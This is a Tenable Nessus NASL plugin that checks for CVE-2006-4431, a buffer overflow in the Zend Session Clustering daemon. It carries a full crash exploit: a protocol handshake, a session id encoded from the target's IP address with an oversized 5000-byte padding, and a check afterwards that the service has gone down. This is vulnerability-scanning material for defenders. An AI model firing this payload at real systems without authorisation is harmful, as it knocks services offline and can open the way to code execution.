#
# (C) Tenable Network Security
#


if (description)
{
  script_id(22273);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-4431");
  script_bugtraq_id(19692);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"28230");

  script_name(english:"Zend Session Clustering Daemon Buffer Overflow Vulnerability");
  script_summary(english:"Tries to crash Zend Session Clustering daemon");

  desc = "
Synopsis :

The remote server is affected by a buffer overflow vulnerability. 

Description :

The version of Zend's Session Clustering daemon on the remote host
contains a buffer overflow that can be exploited by an attacker using
a specially-crafted session id to crash the affected service and even
execute arbitrary code subject to the permissions of the user id
running it. 

See also :

http://www.hardened-php.net/advisory_052006.128.html
http://www.securityfocus.com/archive/1/444263/30/0/threaded

Solution :

Upgrade to Zend Platform version 2.2.1a or later. 

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("zend_scd_detect.nasl");
  script_require_ports("Services/zend_scd", 34567);

  exit(0);
}


include("byte_func.inc");
include("misc_func.inc");


port = get_kb_item("Services/zend_scd");
if (!port) port = 34567;
if (!get_port_state(port)) exit(0);


# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);

req1_1 = raw_string(0x00, 0x00, 0x30, 0x39);
req1_2 = raw_string(0x00, 0x00, 0x00, 0x06);
send(socket:soc, data:req1_1+req1_2);
res = recv(socket:soc, length:64);
if (
  strlen(res) == 20 &&
  getdword(blob:res, pos:0) == 0x303a &&
  getdword(blob:res, pos:4) == 6
)
{
  # Try to exploit the issue to crash the service.
  octs = split(get_host_ip(), sep:'.', keep:FALSE);
  if (isnull(octs)) exit(0);

  # nb: the initial component in the session identifier must be valid;
  #     this is an encoded IP address, and we assume the target's 
  #     IP address will work.
  sid = str_replace(
    string:string(
      hex(octs[0]^186), 
      hex(octs[1]^186), 
      hex(octs[2]^176),                # nb: yes, this one is different!
      hex(octs[3]^186)
    ), 
    find:"0x", 
    replace:""
  );
  sid += ":baba37bd:00000000:00000000:00000000:00000000:" + crap(5000);

  req2_1 = raw_string(0x00, 0x00, 0x30, 0x3b);
  req2_2 = mkdword(0x0c) + 
    mkdword(0x00) +
    mkdword(strlen(sid)) + 
    mkdword(0) + 
    mkdword(0) + 
    mkdword(0) +
    sid;
  send(socket:soc, data:req2_1+req2_2);
  res = recv(socket:soc, length:64);

  if (!strlen(res))
  {
    # Try to reestablish a connection and read the banner.
    soc2 = open_sock_tcp(port);
    if (soc2)
    {
      send(socket:soc2, data:req1_1+req1_2);
      res2 = recv(socket:soc2, length:64);
      close(soc2);
    }

    # If we couldn't establish the connection or read the banner,
    # there's a problem.
    if (!soc2 || !strlen(res2))
    {
      security_hole(port);
      exit(0);
    }
  }
}
